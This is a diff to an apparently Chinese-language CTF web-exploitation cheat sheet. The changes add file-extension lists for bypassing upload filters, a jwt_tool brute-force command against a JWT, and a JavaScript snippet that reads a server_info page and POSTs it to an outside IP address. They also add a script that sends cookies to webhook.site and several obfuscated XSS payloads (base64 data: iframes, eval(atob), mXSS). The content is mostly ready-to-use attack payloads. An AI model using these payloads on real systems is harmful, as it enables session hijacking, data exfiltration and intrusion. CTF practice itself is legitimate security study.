@@ -43,16 +43,10 @@ Content-Type: application/octet-stream
 
 ## 后缀
 ```bash
-    "php",
-    "php3",
-    "php4",
-    "php5",
-    "php7",
-    "pht",
-    "phtm",
-    "phtml",
-    "phar",
-    "phps",
+常用后缀
+asp/aspx:asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr
+php:php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml
+js:jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml
 ```
 
 ## .htaccess
@@ -123,7 +117,8 @@ content=php_value auto_prepend_file D:\\phpstudy_pro\\www\\flag.php%0a%23\
 爆破,jwt_tool在`CTF_TOOL`下
 
 ```bash
-python .\jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI0OTI5MSIsImlhdCI6MTcwMDU0NzM5MSwiZXhwIjoxNzAxMTUyMTkxfQ.hKwliNI5OGbTrpcrxRZ8Bvq978ur4o483jmD2CFbbbhO5V9_3HHNTK6YZ9-YaE4lFOnTeRjYQkyKYsPprFAr0g -C -d D:\dict\wordlists\rockyou.txt
+cd D:\CTF_Tools\jwt_tool\
+python .\jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2ODBmMDk0MWM0MGQ1MzIxYjM0Y2VjY2YiLCJpc0FkbWluIjpmYWxzZSwiaWF0IjoxNzQ1ODE1ODc2LCJleHAiOjE3NDU5MDIyNzZ9.OIhmMYq9pHCvx2N5CV-F-AMwbWvo5zQOBimQ2DVlBPs -C -d D:\dict\wordlists\rockyou.txt
 ```
 
 空算法攻击
@@ -1233,6 +1228,33 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==
 # XXE
 
 # XSS
+
+请求内容并发送,如读取phpinfo盗取cookie
+```js
+const apiUrl = 'http://robots.thm/harm/to/self/server_info.php'
+const postUrl = 'http://10.21.146.169:8085/';
+
+fetch(apiUrl)
+  .then(response => response.text())
+  .then(body => {
+    return fetch(postUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: body,
+    });
+  })
+  .then(postResponse => {
+    if (!postResponse.ok) {
+      throw new Error('Post response was not ok');
+    }
+    return postResponse.json();
+  })
+  .then(postData => console.log(postData))
+  .catch(console.error);
+```
+
 ```js
 //窃取cookie
 <script>document.location='https://webhook.site/(some_id)?cookie='+document.cookie;</script>
@@ -1244,8 +1266,19 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==
 javasc%09ript:alert(1)
 ```
 
+```js
+<noscript><style>/*</noscript><img%20src%20onerror=alert(1)>*/
+```
 
+```js
+<iframe src="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=">
+<embed src="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></embed>
+<a href=javascript:eval(atob('YWxlcnQoMSk='))>test</a>
+<script>alert`1`</script>
+<script>alert(/xss/)</script>
+```
 
+https://sonarsource.github.io/mxss-cheatsheet/examples/
 # search word
 无字母数字- non-alphanumeric characters
 
